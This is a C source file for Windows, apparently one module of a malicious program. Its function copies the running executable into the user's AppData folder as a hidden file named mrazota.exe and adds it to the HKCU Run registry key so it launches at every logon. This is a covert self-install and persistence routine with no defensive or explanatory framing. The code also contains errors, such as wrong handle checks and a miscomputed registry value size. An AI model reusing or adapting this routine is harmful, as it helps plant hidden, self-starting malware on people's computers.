#include <Windows.h>
#include <malloc.h>
#include "getModulePath.h"

#include "installAndAutorun.h"
BOOL installAndAutorun() {
	DWORD install_len;
	install_len = ExpandEnvironmentStringsW(L"%APPDATA%\\mrazota.exe", NULL, 0);
	if (install_len) {
		LPWSTR install_path;
		install_path = _malloca(install_len * sizeof(WCHAR));
		if (install_path && ExpandEnvironmentStringsW(L"%APPDATA%\\mrazota.exe", install_path, install_len)) {
			DWORD modpath_len;
			LPWSTR modpath;
			modpath = getModulePath(&modpath_len);
			if (modpath) {
				if (wcscmp(install_path, modpath)) {
					HANDLE read_handle;
					read_handle = CreateFileW(modpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (read_handle) {
						LARGE_INTEGER file_size;
						if (GetFileSizeEx(read_handle, &file_size) && (file_size.HighPart == 0)) {
							LPVOID contents;
							contents = malloc(file_size.LowPart);
							if (contents) {
								if (ReadFile(read_handle, contents, file_size.LowPart, NULL, NULL)) {
									HANDLE write_handle;
									write_handle = CreateFileW(install_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
									if (write_handle) {
										if (WriteFile(write_handle, contents, file_size.LowPart, NULL, NULL)) {
											HKEY run_key;
											if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &run_key)) {
												if (ERROR_SUCCESS != RegSetValueExW(run_key, L"mrazota", 0, REG_SZ, (BYTE*)install_path, install_len * sizeof(DWORD))) DeleteFileW(install_path);
												RegCloseKey(run_key);
											}
											else DeleteFileW(install_path);
										};
										CloseHandle(write_handle);
									};
								};
								free(contents);
							};
						};
						CloseHandle(read_handle);
					};
				}
				else {
					free(modpath);
					_freea(install_path);
					return TRUE;
				};
			};
			free(modpath);
		};
		_freea(install_path);
	};
	return FALSE;
};